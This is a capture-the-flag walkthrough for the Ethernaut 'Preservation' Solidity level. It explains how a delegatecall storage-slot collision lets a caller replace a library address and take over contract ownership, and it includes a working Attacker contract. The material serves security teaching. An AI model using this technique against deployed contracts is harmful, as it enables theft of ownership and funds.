# Preservation Ethernaut

## Goals

=> This contract utilizes a library to store two different times for two different timezones. The constructor creates two instances of the library for each time to be stored.

=> The goal of this level is for you to claim ownership of the instance you are given.

### Hints

- Look into Solidity's documentation on the delegatecall low level function, how it works, how it can be used to delegate operations to on-chain. libraries, and what implications it has on execution scope.
- Understanding what it means for delegatecall to be context-preserving.
- Understanding how storage variables are stored and accessed.
- Understanding how casting works between different data types.

### Solution

- The Problem lies in the wrong usage of the delegate call, if we call `setFirstTime()` and pass in the address typecasted to a uint256 of our `Attacker` contract the `setTime()` function in the LibraryContract will change the variable in storage slot 1 of the `Preservation` contract, which is `timeZone1Library` to our contract, now if we call this function a second time the `Preservation` contract will call into our contract, where we can just do `owner = YOURADDRESS` for that our `Attacker` contract needs to mimic the storage layout of the preservation contract obviously, so it accesses storage slot 3 in the `Preservation` contract.

### Attacker Contract

```solidity
contract Attacker {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function attack(Preservation preservation) external {
        // timeZone1Library will be this address after this call
        preservation.setFirstTime(uint256(uint160(address(this))));
    }

    function setTime(uint _time) external {
        // this will change the target contracts owner storage variable owner to my address
        owner = address(0xe4064d8E292DCD971514972415664765e51B5364);
    }
}

```
